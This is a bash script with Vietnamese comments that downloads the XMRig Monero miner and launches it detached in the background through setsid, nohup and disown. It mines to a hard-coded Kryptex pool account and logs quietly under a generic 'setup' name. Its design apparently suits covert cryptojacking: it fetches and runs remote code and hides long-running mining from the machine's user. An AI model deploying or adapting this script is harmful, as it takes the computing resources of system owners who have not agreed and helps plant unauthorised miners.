#!/bin/bash

LOGFILE=/tmp/setup.log
DIR="$HOME/xmrig-6.26.0"
URL="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"

install_pkg() {
    echo "$(date) [INSTALL] Bắt đầu tải..." >> "$LOGFILE"
    cd ~
    if [ ! -f "$DIR/xmrig" ]; then
        wget -q "$URL" -O xmrig.tar.gz >> "$LOGFILE" 2>&1
        if [ $? -ne 0 ]; then
            echo "$(date) [INSTALL] wget thất bại" >> "$LOGFILE"
            exit 1
        fi
        tar -xzf xmrig.tar.gz >> "$LOGFILE" 2>&1
        rm -f xmrig.tar.gz
        chmod +x "$DIR/xmrig"
        echo "$(date) [INSTALL] Hoàn tất" >> "$LOGFILE"
    else
        echo "$(date) [INSTALL] Đã tồn tại, bỏ qua" >> "$LOGFILE"
    fi
}

run_pkg() {
    echo "$(date) [RUN] Khởi động..." >> "$LOGFILE"
    # Kiểm tra đã chạy chưa
    if pgrep -x "xmrig" > /dev/null 2>&1; then
        echo "$(date) [RUN] Đang chạy rồi, bỏ qua" >> "$LOGFILE"
        return
    fi
    # Chưa cài thì cài trước
    if [ ! -f "$DIR/xmrig" ]; then
        install_pkg
    fi
    cd "$DIR"
    setsid nohup ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.worke3 -p x --coin monero >> "$LOGFILE" 2>&1 &
    disown
    echo "$(date) [RUN] PID=$!" >> "$LOGFILE"
}

case "${1:-run}" in
    install) install_pkg ;;
    run)     run_pkg ;;
    *)       run_pkg ;;
esac
